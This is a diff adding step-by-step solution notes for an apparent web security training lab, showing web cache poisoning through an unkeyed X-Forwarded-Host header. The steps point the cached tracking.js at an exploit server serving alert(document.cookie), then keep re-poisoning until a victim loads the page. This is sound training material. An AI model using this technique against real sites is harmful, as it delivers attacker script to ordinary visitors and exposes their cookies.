@@ -1,0 +1,22 @@
+Solution Steps:
+
+1. Load the home page with Burp Suite running.
+2. Find the GET / request in Proxy → HTTP history and send it to Repeater.
+3. Add a cache-buster parameter:
+   ?cb=1234
+4. Add the header:
+   X-Forwarded-Host: example.com
+5. Send the request and verify that /resources/js/tracking.js is generated using the X-Forwarded-Host value.
+6. Replay the request until the response contains:
+   X-Cache: hit
+7. On the Exploit Server, change the file path to:
+   /resources/js/tracking.js
+8. Add the payload:
+   alert(document.cookie)
+   and store the exploit.
+9. Return to the original GET request and remove the cache-buster parameter.
+10. Set:
+    X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+11. Keep sending the request until the exploit server URL is reflected in the response and X-Cache: hit is displayed.
+12. Open the poisoned URL in the browser and verify that alert(document.cookie) is triggered.
+13. If the lab is still unsolved, repeat the poisoning request every few seconds until the victim accesses the cached page.
